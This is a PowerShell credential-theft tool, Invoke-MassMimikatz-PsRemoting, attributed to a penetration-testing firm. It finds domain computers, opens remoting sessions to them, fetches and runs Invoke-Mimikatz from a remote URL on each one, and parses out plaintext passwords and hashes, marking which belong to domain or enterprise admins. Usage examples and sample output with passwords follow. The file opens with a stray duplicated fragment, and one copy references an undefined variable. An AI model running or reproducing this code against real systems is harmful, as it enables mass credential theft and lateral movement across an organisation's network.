                    New-PSSession -ComputerName $MyComputer -Credential $Credential -ErrorAction SilentlyContinue -ThrottleLimit $MaxHosts | Out-Null          
                    # Get session count
                    $SessionCount = Get-PSSession | Measure-Object | select count -ExpandProperty count
                    Write-Verbose "Established Sessions: $SessionCount of $MaxHosts - Processing server $ServerCounter of $ServerCount - $MyComputer"         
                    
                }
            }  
            
                        
            # ---------------------------------------------
            # Attempt to run mimikatz against open sessions
            # ---------------------------------------------
            if($SessionCount -ge 1){

                # run the mimikatz command
                Write-verbose "Running reflected Mimikatz against $SessionCount open ps sessions..."
                $x = Get-PSSession
                [string]$MimikatzOutput = Invoke-Command -Session $x -ScriptBlock {Invoke-Expression (new-object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1");invoke-mimikatz -ErrorAction SilentlyContinue} -ErrorAction SilentlyContinue           
                $TblResults = Parse-Mimikatz -raw $MimikatzOutput
                $TblResults | foreach {
            
                    [string]$pwtype = $_.pwtype.ToLower()
                    [string]$pwdomain = $_.domain.ToLower()
                    [string]$pwusername = $_.username.ToLower()
                    [string]$pwpassword = $_.password
                    
                    # Check if user has da/ea privs - requires autotarget
                    if ($AutoTarget)
                    {
                        $ea = "No"
                        $da = "No"

                        # Check if user is enterprise admin                   
                        $EnterpriseAdmins |
                        ForEach-Object {
                            $EaUser = $_.GroupMember
                            if ($EaUser -eq $pwusername){
                                $ea = "Yes"
                            }
                        }
                    
                        # Check if user is domain admin
                        $DomainAdmins |
                        ForEach-Object {
                            $DaUser = $_.GroupMember
                            if ($DaUser -eq $pwusername){
                                $da = "Yes"
                            }
                        }
                    }else{
                        $ea = "Unknown"
                        $da = "Unknown"
                    }

                    # Add credential to list
                    $TblPasswordList.Rows.Add($PWtype,$pwdomain,$pwusername,$pwpassword,$ea,$da) | Out-Null
                }            

                # remove sessions
                Write-verbose "Removing ps sessions..."
                Disconnect-PSSession -Session $x | Out-Null
                Remove-PSSession -Session $x | Out-Null

            }else{
                Write-verbose "No ps sessions could be created."
            }                 
        }

        # Clean and results
        End
        {
                # Clear server list
                $TblServers.Clear()

                # Return passwords
                if ($TblPasswordList.row.count -eq 0){
                    Write-Verbose "No credentials were recovered."
                    Write-Verbose "Done."
                }else{
                    $TblPasswordList | select domain,username,password,EnterpriseAdmin,DomainAdmin -Unique | Sort-Object username,password,domain
                }                
        }
    }
    <#

Script mod author
    Scott Sutherland (@_nullbind), 2015 NetSPI

Description
    This script can be used to run mimikatz on multiple servers from both domain and non-domain systems using psremoting.
    Features/credits:
    	 - Idea: rob, will, and carlos
	 - Input: Accepts host from pipeline (will's code)
	 - Input: Accepts host list from file (will's code)
	 - AutoTarget option will lookup domain computers from DC (carlos's code)
	 - Ability to filter by OS (scott's code)
	 - Ability to only target domain systems with WinRm installed (vai SPNs) (scott's code)
	 - Ability to limit number of hosts to run Mimikatz on (scott's code)
	 - More descriptive verbose error messages (scott's code)
	 - Ability to specify alternative credentials and connect from a non-domain system (carlos's code)
	 - Runs mimikatz on target system using ie/download/execute cradle (chris's, Joseph's, Matt's, and benjamin's code)
	 - Parses mimikatz output (will's code)
	 - Returns enumerated credentials in a data table which can be used in the pipeline (scott's code)
	 
Notes
    This is based on work done by rob fuller, Joseph Bialek, carlos perez, benjamin delpy, Matt Graeber, Chris campbell, and will schroeder.
    Returns data table object to pipeline with creds.
    Weee PowerShell.

Command Examples

    # Run command as current domain user.  Enumerate and target all domain systems, but only run mimikatz on 5 systems.
    Invoke-MassMimikatz-PsRemoting –Verbose –AutoTarget –MaxHost 5

    # Run command as current domain user.  Enumerate and target all domain systems, but only run mimikatz on 5 systems.  Also, filter for systems with wmi enabled that are running Server 2012.
    Invoke-MassMimikatz-PsRemoting –Verbose –AutoTarget –MaxHost 5 –OsFilter “2012” –WinRm

    # Run command as current domain user.  Enumerate and target all domain systems, but only run mimikatz on 5 systems.  Also, filter for systems with wmi enabled that are running Server 2012.  Also, specify systems from host file.
    Invoke-MassMimikatz-PsRemoting –Verbose –AutoTarget –MaxHost 5 –OsFilter “2012” –WinRm –HostList c:\temp\hosts.txt

    # Run command as current domain user.  Enumerate and target all domain systems, but only run mimikatz on 5 systems.  Also, filter for systems with wmi enabled (spn) that are running Server 2012.  Also, specify systems from host file.  Also, target single system as parameter.
    Invoke-MassMimikatz-PsRemoting –Verbose –AutoTarget –MaxHost 5 –OsFilter “2012” –WinRm –HostList c:\temp\hosts.txt –Hosts “10.2.3.9”

     # Run command from non-domain system using alternative credentials. Target 10.1.1.1.
    “10.1.1.1” | Invoke-MassMimikatz-PsRemoting –Verbose –Credential domain\user

    # Run command from non-domain system using alternative credentials.  Target 10.1.1.1, authenticate to the dc at 10.2.2.1 to determine if user is a da, and only pull passwords from one system.
    “10.1.1.1” | Invoke-MassMimikatz-PsRemoting –Verbose  –Credential domain\user –DomainController 10.2.2.1 –AutoTarget -MaxHosts 1

    # Run command from non-domain system using alternative credentials.  Enumerate and target all domain systems, but only run mimikatz on 5 systems.
    Invoke-MassMimikatz-PsRemoting –Verbose –AutoTarget –MaxHost 5 –DomainController 10.2.2.1 –Credential domain\user

    # Run command from non-domain system using alternative credentials.  Enumerate and target all domain systems, but only run mimikatz on 5 systems.  Then output output to csv.
    Invoke-MassMimikatz-PsRemoting –Verbose –AutoTarget –MaxHost 5 –DomainController 10.2.2.1 –Credential domain\user | Export-Csv c:\temp\domain-creds.csv  -NoTypeInformation 

Output Sample 1

    PS C:\> "10.1.1.1" | Invoke-MassMimikatz-PsRemoting -Verbose -Credential domain\user | ft -AutoSize
    VERBOSE: Getting list of Servers from provided hosts...
    VERBOSE: Found 1 servers that met search criteria.
    VERBOSE: Attempting to create 1 ps sessions...
    VERBOSE: Established Sessions: 1 of 1 - Processing server 1 of 1 - 10.1.1.1
    VERBOSE: Running reflected Mimikatz against 1 open ps sessions...
    VERBOSE: Removing ps sessions...

    Domain      Username      Password                         EnterpriseAdmin DomainAdmin
    ------      --------      --------                         --------------- -----------    
    test        administrator MyEAPassword!                    Unknown         Unknown    
    test.domain administrator MyEAPassword!                    Unknown         Unknown    
    test        myadmin       MyDAPAssword!                    Unknown         Unknown    
    test.domain myadmin       MyDAPAssword!                    Unknown         Unknown       

Output Sample 2

PS C:\> "10.1.1.1" |Invoke-MassMimikatz-PsRemoting -Verbose -Credential domain\user -DomainController 10.1.1.2 -AutoTarget | ft -AutoSize
    VERBOSE: Getting list of Servers from provided hosts...
    VERBOSE: Getting list of Servers from DC...
    VERBOSE: Getting list of Enterprise and Domain Admins...
    VERBOSE: Found 3 servers that met search criteria.
    VERBOSE: Attempting to create 3 ps sessions...
    VERBOSE: Established Sessions: 0 of 3 - Processing server 1 of 3 - 10.1.1.1
    VERBOSE: Established Sessions: 1 of 3 - Processing server 2 of 3 - server1.domain.com
    VERBOSE: Established Sessions: 1 of 3 - Processing server 3 of 3 - server2.domain.com
    VERBOSE: Running reflected Mimikatz against 1 open ps sessions...
    VERBOSE: Removing ps sessions...

    Domain      Username      Password                         EnterpriseAdmin DomainAdmin
    ------      --------      --------                         --------------- -----------    
    test        administrator MyEAPassword!                    Yes             Yes    
    test.domain administrator MyEAPassword!                    Yes             Yes     
    test        myadmin       MyDAPAssword!                    No              Yes     
    test.domain myadmin       MyDAPAssword!                    No              Yes 
    test        myuser        MyUserPAssword!                  No              No
    test.domain myuser        MyUSerPAssword!                  No              No                


Todo
    fix loop
    fix parsing so password hashes show up differently.
    fix psurl
    add will's / obscuresec's self-serv mimikatz file option

References
	pending

#>
function Invoke-MassMimikatz-PsRemoting
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="Credentials to use when connecting to a Domain Controller.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        HelpMessage="Domain controller for Domain and Site that you want to query against.")]
        [string]$DomainController,

        [Parameter(Mandatory=$false,
        HelpMessage="This limits how many servers to run mimikatz on.")]
        [int]$MaxHosts = 5,

        [Parameter(Position=0,ValueFromPipeline=$true,
        HelpMessage="This can be use to provide a list of host.")]
        [String[]]
        $Hosts,

        [Parameter(Mandatory=$false,
        HelpMessage="This should be a path to a file containing a host list.  Once per line")]
        [String]
        $HostList,

        [Parameter(Mandatory=$false,
        HelpMessage="Limit results by the provided operating system. Default is all.  Only used with -autotarget.")]
        [string]$OsFilter = "*",

        [Parameter(Mandatory=$false,
        HelpMessage="Limit results by only include servers with registered winrm services. Only used with -autotarget.")]
        [switch]$WinRM,

        [Parameter(Mandatory=$false,
        HelpMessage="This get a list of computer from ADS withthe applied filters.")]
        [switch]$AutoTarget,

        [Parameter(Mandatory=$false,
        HelpMessage="Set the url to download invoke-mimikatz.ps1 from.  The default is the github repo.")]
        [string]$PsUrl = "https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1",

        [Parameter(Mandatory=$false,
        HelpMessage="Maximum number of Objects to pull from AD, limit is 1,000 .")]
        [int]$Limit = 1000,

        [Parameter(Mandatory=$false,
        HelpMessage="scope of a search as either a base, one-level, or subtree search, default is subtree.")]
        [ValidateSet("Subtree","OneLevel","Base")]
        [string]$SearchScope = "Subtree",

        [Parameter(Mandatory=$false,
        HelpMessage="Distinguished Name Path to limit search to.")]

        [string]$SearchDN
    )

        # Setup initial authentication, adsi, and functions
        Begin
        {
            if ($DomainController -and $Credential.GetNetworkCredential().Password)
            {
                $objDomain = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)", $Credential.UserName,$Credential.GetNetworkCredential().Password
                $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
            }
            else
            {
                $objDomain = [ADSI]""  
                $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
            }


            # ----------------------------------------
            # Setup required data tables
            # ----------------------------------------

            # Create data table to house results to return
            $TblPasswordList = New-Object System.Data.DataTable 
            $TblPasswordList.Columns.Add("Type") | Out-Null
            $TblPasswordList.Columns.Add("Domain") | Out-Null
            $TblPasswordList.Columns.Add("Username") | Out-Null
            $TblPasswordList.Columns.Add("Password") | Out-Null  
            $TblPasswordList.Columns.Add("EnterpriseAdmin") | Out-Null  
            $TblPasswordList.Columns.Add("DomainAdmin") | Out-Null  
            $TblPasswordList.Clear()

             # Create data table to house results
            $TblServers = New-Object System.Data.DataTable 
            $TblServers.Columns.Add("ComputerName") | Out-Null


            # ----------------------------------------
            # Function to grab domain computers
            # ----------------------------------------
            function Get-DomainComputers
            {
                [CmdletBinding()]
                Param(
                    [Parameter(Mandatory=$false,
                    HelpMessage="Credentials to use when connecting to a Domain Controller.")]
                    [System.Management.Automation.PSCredential]
                    [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
                    [Parameter(Mandatory=$false,
                    HelpMessage="Domain controller for Domain and Site that you want to query against.")]
                    [string]$DomainController,

                    [Parameter(Mandatory=$false,
                    HelpMessage="Limit results by the provided operating system. Default is all.")]
                    [string]$OsFilter = "*",

                    [Parameter(Mandatory=$false,
                    HelpMessage="Limit results by only include servers with registered winrm services.")]
                    [switch]$WinRM,

                    [Parameter(Mandatory=$false,
                    HelpMessage="Maximum number of Objects to pull from AD, limit is 1,000 .")]
                    [int]$Limit = 1000,

                    [Parameter(Mandatory=$false,
                    HelpMessage="scope of a search as either a base, one-level, or subtree search, default is subtree.")]
                    [ValidateSet("Subtree","OneLevel","Base")]
                    [string]$SearchScope = "Subtree",

                    [Parameter(Mandatory=$false,
                    HelpMessage="Distinguished Name Path to limit search to.")]

                    [string]$SearchDN
                )

                Write-verbose "Getting list of Servers from DC..."

                # Get domain computers from dc 
                if ($OsFilter -eq "*"){
                    $OsCompFilter = "(operatingsystem=*)"
                }else{
                    $OsCompFilter = "(operatingsystem=*$OsFilter*)"
                }

                # Select winrm spns if flagged
                if($WinRM){
                    $winrmComFilter = "(servicePrincipalName=*WSMAN*)"
                }else{
                    $winrmComFilter = ""
                }

                $CompFilter = "(&(objectCategory=Computer)$winrmComFilter $OsCompFilter)"        
                $ObjSearcher.PageSize = $Limit
                $ObjSearcher.Filter = $CompFilter
                $ObjSearcher.SearchScope = "Subtree"

                if ($SearchDN)
                {
                    $objSearcher.SearchDN = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$($SearchDN)")         
                }

                $ObjSearcher.FindAll() | ForEach-Object {
            
                    #add server to data table
                    $ComputerName = [string]$_.properties.dnshostname                    
                    $TblServers.Rows.Add($ComputerName) | Out-Null 
                }
            }

            # ----------------------------------------
            # Function to check group membership 
            # ----------------------------------------        
            function Get-GroupMember
            {
                [CmdletBinding()]
                Param(
                    [Parameter(Mandatory=$false,
                    HelpMessage="Credentials to use when connecting to a Domain Controller.")]
                    [System.Management.Automation.PSCredential]
                    [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
                    [Parameter(Mandatory=$false,
                    HelpMessage="Domain controller for Domain and Site that you want to query against.")]
                    [string]$DomainController,

                    [Parameter(Mandatory=$false,
                    HelpMessage="Maximum number of Objects to pull from AD, limit is 1,000 .")]
                    [string]$Group = "Domain Admins",

                    [Parameter(Mandatory=$false,
                    HelpMessage="Maximum number of Objects to pull from AD, limit is 1,000 .")]
                    [int]$Limit = 1000,

                    [Parameter(Mandatory=$false,
                    HelpMessage="scope of a search as either a base, one-level, or subtree search, default is subtree.")]
                    [ValidateSet("Subtree","OneLevel","Base")]
                    [string]$SearchScope = "Subtree",

                    [Parameter(Mandatory=$false,
                    HelpMessage="Distinguished Name Path to limit search to.")]
                    [string]$SearchDN
                )
  
                if ($DomainController -and $Credential.GetNetworkCredential().Password)
                   {
                        $root = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)", $Credential.UserName,$Credential.GetNetworkCredential().Password
                        $rootdn = $root | select distinguishedName -ExpandProperty distinguishedName
                        $objDomain = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)/CN=$Group, CN=Users,$rootdn" , $Credential.UserName,$Credential.GetNetworkCredential().Password
                        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
                    }
                    else
                    {
                        $root = ([ADSI]"").distinguishedName
                        $objDomain = [ADSI]("LDAP://CN=$Group, CN=Users," + $root)  
                        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
                    }
        
                    # Create data table to house results to return
                    $TblMembers = New-Object System.Data.DataTable 
                    $TblMembers.Columns.Add("GroupMember") | Out-Null 
                    $TblMembers.Clear()

                    $objDomain.member | %{                    
                        $TblMembers.Rows.Add($_.split("=")[1].split(",")[0]) | Out-Null 
                }

                return $TblMembers
            }

            # ----------------------------------------
            # Mimikatz parse function (Will Schoeder's) 
            # ----------------------------------------

            # This is a *very slightly mod version of will schroeder's function from:
            # https://raw.githubusercontent.com/Veil-Framework/PowerTools/master/PewPewPew/Invoke-MassMimikatz.ps1
            function Parse-Mimikatz {

                [CmdletBinding()]
                param(
                    [string]$raw
                )
    
                # Create data table to house results
                $TblPasswords = New-Object System.Data.DataTable 
                $TblPasswords.Columns.Add("PwType") | Out-Null
                $TblPasswords.Columns.Add("Domain") | Out-Null
                $TblPasswords.Columns.Add("Username") | Out-Null
                $TblPasswords.Columns.Add("Password") | Out-Null    

                # msv
	            $results = $raw | Select-String -Pattern "(?s)(?<=msv :).*?(?=tspkg :)" -AllMatches | %{$_.matches} | %{$_.value}
                if($results){
                    foreach($match in $results){
                        if($match.Contains("Domain")){
                            $lines = $match.split("`n")
                            foreach($line in $lines){
                                if ($line.Contains("Username")){
                                    $username = $line.split(":")[1].trim()
                                }
                                elseif ($line.Contains("Domain")){
                                    $domain = $line.split(":")[1].trim()
                                }
                                elseif ($line.Contains("NTLM")){
                                    $password = $line.split(":")[1].trim()
                                }
                            }
                            if ($password -and $($password -ne "(null)")){
                                #$username+"/"+$domain+":"+$password
                                $Pwtype = "msv"
                                $TblPasswords.Rows.Add($Pwtype,$domain,$username,$password) | Out-Null 
                            }
                        }
                    }
                }
                $results = $raw | Select-String -Pattern "(?s)(?<=tspkg :).*?(?=wdigest :)" -AllMatches | %{$_.matches} | %{$_.value}
                if($results){
                    foreach($match in $results){
                        if($match.Contains("Domain")){
                            $lines = $match.split("`n")
                            foreach($line in $lines){
                                if ($line.Contains("Username")){
                                    $username = $line.split(":")[1].trim()
                                }
                                elseif ($line.Contains("Domain")){
                                    $domain = $line.split(":")[1].trim()
                                }
                                elseif ($line.Contains("Password")){
                                    $password = $line.split(":")[1].trim()
                                }
                            }
                            if ($password -and $($password -ne "(null)")){
                                #$username+"/"+$domain+":"+$password
                                $Pwtype = "wdigest/tspkg"
                                $TblPasswords.Rows.Add($Pwtype,$domain,$username,$password) | Out-Null
                            }
                        }
                    }
                }
                $results = $raw | Select-String -Pattern "(?s)(?<=wdigest :).*?(?=kerberos :)" -AllMatches | %{$_.matches} | %{$_.value}
                if($results){
                    foreach($match in $results){
                        if($match.Contains("Domain")){
                            $lines = $match.split("`n")
                            foreach($line in $lines){
                                if ($line.Contains("Username")){
                                    $username = $line.split(":")[1].trim()
                                }
                                elseif ($line.Contains("Domain")){
                                    $domain = $line.split(":")[1].trim()
                                }
                                elseif ($line.Contains("Password")){
                                    $password = $line.split(":")[1].trim()
                                }
                            }
                            if ($password -and $($password -ne "(null)")){
                                #$username+"/"+$domain+":"+$password
                                $Pwtype = "wdigest/kerberos"
                                $TblPasswords.Rows.Add($Pwtype,$domain,$username,$password) | Out-Null
                            }
                        }
                    }
                }
                $results = $raw | Select-String -Pattern "(?s)(?<=kerberos :).*?(?=ssp :)" -AllMatches | %{$_.matches} | %{$_.value}
                if($results){
                    foreach($match in $results){
                        if($match.Contains("Domain")){
                            $lines = $match.split("`n")
                            foreach($line in $lines){
                                if ($line.Contains("Username")){
                                    $username = $line.split(":")[1].trim()
                                }
                                elseif ($line.Contains("Domain")){
                                    $domain = $line.split(":")[1].trim()
                                }
                                elseif ($line.Contains("Password")){
                                    $password = $line.split(":")[1].trim()
                                }
                            }
                            if ($password -and $($password -ne "(null)")){
                                #$username+"/"+$domain+":"+$password
                                $Pwtype = "kerberos/ssp"
                                $TblPasswords.Rows.Add($PWtype,$domain,$username,$password) | Out-Null
                            }
                        }
                    }
                }

                # Remove the computer accounts
                $TblPasswords_Clean = $TblPasswords | Where-Object { $_.username -notlike "*$"}

                return $TblPasswords_Clean
            }
        }

        # Conduct attack
        Process 
        {

            # ----------------------------------------
            # Compile list of target systems
            # ----------------------------------------

            # Get list of systems from the command line / pipeline            
            if ($Hosts)
            {
                Write-verbose "Getting list of Servers from provided hosts..."
                $Hosts | 
                %{ 
                    $TblServers.Rows.Add($_) | Out-Null 
                }
            }

            # Get list of systems from the command line / pipeline
            if($HostList){
                Write-verbose "Getting list of Servers $HostList..."                
                if (Test-Path -Path $HostList){
                    $HostListHosts += Get-Content -Path $HostList
                    $HostListHosts|
                    %{
                        $TblServers.Rows.Add($_) | Out-Null
                    }
                }else{
                    Write-Warning "[!] Input file '$HostList' doesn't exist!"
                }            
            }

            # Get list of domain systems from dc and add to the server list
            if ($AutoTarget)
            {
                if ($OsFilter){
                    $FlagOsFilter = "$OsFilter"
                }else{
                    $FlagOsFilter = "*"
                }


                if ($WinRM){
                    Get-DomainComputers -WinRM -OsFilter $OsFilter
                }else{
                    Get-DomainComputers -OsFilter $OsFilter
                }
            }


            # ----------------------------------------
            # Get list of entrprise/domain admins
            # ----------------------------------------
            if ($AutoTarget)
            {
                Write-Verbose "Getting list of Enterprise and Domain Admins..."
                if ($DomainController -and $Credential.GetNetworkCredential().Password)            
                {           
                    $EnterpriseAdmins = Get-GroupMember -Group "Enterprise Admins" -DomainController $DomainController -Credential $Credential
                    $DomainAdmins = Get-GroupMember -Group "Domain Admins" -DomainController $DomainController -Credential $Credential
                }else{

                    $EnterpriseAdmins = Get-GroupMember -Group "Enterprise Admins"
                    $DomainAdmins = Get-GroupMember -Group "Domain Admins"
                }
            }


            # ----------------------------------------
            # Establish sessions
            # ---------------------------------------- 
            $ServerCount = $TblServers.Rows.Count

            if($ServerCount -eq 0){
                Write-Verbose "No target systems were provided."
                break
            }

            if($ServerCount -lt $MaxHosts){
                $MaxHosts = $ServerCount
            }

            Write-Verbose "Found $ServerCount servers that met search criteria."            
            Write-verbose "Attempting to create $MaxHosts ps sessions..."

            # Set counters
            $ServerCounter = 0     
            $SessionCount = 0   

            $TblServers | 
            ForEach-Object {
                if ($ServerCounter -le $ServerCount -and $SessionCount -lt $MaxHosts){

                    $ServerCounter = $ServerCounter+1
                
                    # attempt session
                    [string]$MyComputer = $_.ComputerName    
                    
                    New-PSSession -ComputerName $MyComputer -Credential $Credential -ErrorAction SilentlyContinue -ThrottleLimit $MaxHosts | Out-Null          
                    
                    # Get session count
                    $SessionCount = Get-PSSession | Measure-Object | select count -ExpandProperty count
                    Write-Verbose "Established Sessions: $SessionCount of $MaxHosts - Processed server $ServerCounter of $ServerCount - $MyComputer"         
                }
            }  
            
                        
            # ---------------------------------------------
            # Attempt to run mimikatz against open sessions
            # ---------------------------------------------
            if($SessionCount -ge 1){

                # run the mimikatz command
                Write-verbose "Running reflected Mimikatz against $SessionCount open ps sessions..."
                $x = Get-PSSession                              
                [string]$MimikatzOutput = Invoke-Command -Session $x -ScriptBlock {Invoke-Expression -Command  "$args" -ErrorAction SilentlyContinue } -ArgumentList $HostedScript -ErrorAction SilentlyContinue
                $TblResults = Parse-Mimikatz -raw $MimikatzOutput
                $TblResults | foreach {
            
                    [string]$pwtype = $_.pwtype.ToLower()
                    [string]$pwdomain = $_.domain.ToLower()
                    [string]$pwusername = $_.username.ToLower()
                    [string]$pwpassword = $_.password
                    
                    # Check if user has da/ea privs - requires autotarget
                    if ($AutoTarget)
                    {
                        $ea = "No"
                        $da = "No"

                        # Check if user is enterprise admin                   
                        $EnterpriseAdmins |
                        ForEach-Object {
                            $EaUser = $_.GroupMember
                            if ($EaUser -eq $pwusername){
                                $ea = "Yes"
                            }
                        }
                    
                        # Check if user is domain admin
                        $DomainAdmins |
                        ForEach-Object {
                            $DaUser = $_.GroupMember
                            if ($DaUser -eq $pwusername){
                                $da = "Yes"
                            }
                        }
                    }else{
                        $ea = "Unknown"
                        $da = "Unknown"
                    }

                    # Add credential to list
                    $TblPasswordList.Rows.Add($PWtype,$pwdomain,$pwusername,$pwpassword,$ea,$da) | Out-Null
                }            

                # remove sessions
                Write-verbose "Removing ps sessions..."
                Disconnect-PSSession -Session $x | Out-Null
                Remove-PSSession -Session $x | Out-Null

            }else{
                Write-verbose "No ps sessions could be created."
            }                 
        }

        # Clean and results
        End
        {
                # Clear server list
                $TblServers.Clear()

                # Return passwords
                if ($TblPasswordList.row.count -eq 0){
                    Write-Verbose "No credentials were recovered."
                    Write-Verbose "Done."
                }else{
                    $TblPasswordList | select domain,username,password,EnterpriseAdmin,DomainAdmin -Unique | Sort-Object username,password,domain
                }                
        }
    }
